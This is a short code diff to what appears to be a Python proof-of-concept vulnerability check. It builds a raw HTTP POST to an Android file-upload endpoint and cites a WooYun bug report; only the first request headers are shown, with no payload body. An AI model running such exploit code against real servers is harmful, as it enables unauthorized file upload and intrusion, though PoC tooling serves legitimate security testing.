@@ -32,10 +32,9 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
             
             # Referer http://www.wooyun.org/bugs/wooyun-2010-0128219
-            hh = hackhttp.hackhttp(0)
+            hh = hackhttp.hackhttp()
             raw = """
 POST /Android/FileUpload.php?optionID=1 HTTP/1.1
-Host: xxxxx.com
 Content-Length: 316
 Cache-Control: max-age=0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
